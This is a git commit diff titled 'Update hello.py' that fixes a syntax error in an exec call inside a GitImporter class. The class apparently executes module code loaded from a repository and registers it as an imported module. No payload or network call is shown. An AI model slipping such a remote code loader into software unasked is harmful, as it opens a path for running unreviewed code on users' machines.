c9ed9c490c21d068b1a51249129fbf62ab0a36cf
Max88888 <37895634+Max88888@users.noreply.github.com>
2018-03-30 15:45:35 +0800

    Update hello.py

--- hello.py
+++ hello.py
@@ -43,7 +43,7 @@ class GitImporter(object):
 
         module = imp.new_module(name)
 
-        exec(self.current_module_code in module.__dict__)
+        exec(self.current_module_code, module.__dict__)
 
         sys.modules[name] = module
 
